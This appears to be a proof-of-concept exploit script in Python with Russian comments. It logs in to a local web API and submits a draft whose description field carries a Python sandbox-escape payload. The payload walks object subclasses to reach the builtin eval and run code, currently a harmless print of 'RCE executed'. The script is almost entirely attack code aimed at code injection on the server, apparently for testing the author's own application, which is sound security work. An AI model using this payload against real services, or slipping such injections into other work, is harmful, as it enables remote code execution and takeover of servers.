import requests
import json
from requests_toolbelt import MultipartEncoder

# 1. Получение токена
response1 = requests.post(
    "http://localhost:8000/token",
    data={"username": "2", "password": "2"},
    headers={"Content-Type": "application/x-www-form-urlencoded"}
)
token = response1.json()["access_token"]


url = "http://localhost:8000/gdz/save_draft"

malicious_description = "''. __class__ . __base__ . __subclasses__ ()[next(i for i, c in enumerate(__class__.__base__.__subclasses__()) if c.__name__ == 'function')] . __init__ . __globals__ ['__builtins__'] ['eval'] ('print(\"RCE executed\")')"

gdz_data = {
    "description": malicious_description,
    "full_description": "Test full description",
    "category": "math",
    "subject": "algebra",
    "content_text": "Sample content",
    "price": 0,
    "is_elite": False,
    "gdz_id": None
}

data = {
    "gdz_str": json.dumps(gdz_data)
}

headers = {
    "Authorization": f"Bearer {token}"
}

try:
    response = requests.post(url, data=data, headers=headers)
    response.raise_for_status()
    print("Ответ сервера:", response.json())
except requests.exceptions.HTTPError as e:
    print("HTTP ошибка:", e.response.status_code, e.response.text)
except requests.exceptions.RequestException as e:
    print("Ошибка запроса:", str(e))

print("A")


